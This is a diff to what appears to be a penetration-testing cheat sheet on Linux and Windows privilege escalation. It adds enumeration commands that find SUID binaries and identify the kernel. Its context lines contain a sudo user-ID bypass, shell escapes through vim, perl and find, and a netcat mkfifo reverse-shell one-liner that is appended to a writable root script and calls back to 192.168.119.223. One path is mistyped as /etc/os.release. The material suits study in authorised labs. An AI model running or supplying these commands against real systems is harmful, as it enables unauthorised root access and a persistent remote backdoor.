@@ -431,6 +431,8 @@ Description | Command
 | Look for files owned at group level | 		find / -group adm 2>/dev/null (type id to see group name) |
 | Look for files owned by root that we can write to |  find / -user root -perm -002 -type f -not -path "/proc/*"  2>/dev/null |
 | If sudo -l reads (ALL, !root) /bin/bash, try this |  sudo -u#-1 /bin/bash |
+| Identify the distro and kernel |  uname -a; cat /etc/issue; cat /etc/os.release |
+| Locate executables that run with owner's permissions |  find / -perm -2000 -o -perm -4000; sudo -l |
 
 
 What's the OS? What version? What architecture?
@@ -481,6 +483,7 @@ If SeImpersonatePrivilege is available, use Juicy Potato.
 	* If VIM is available, enter vim and type :!bash to exit into root shells
 	* If perl is available, type perl -e 'exec "/bin/bash";'
 	* If find is available, type find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'\;
+
 
 #### One liner to add to writeable scripts running as root:	
 ``` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 192.168.119.223 4242 >/tmp/f" >> user_backups.sh ```
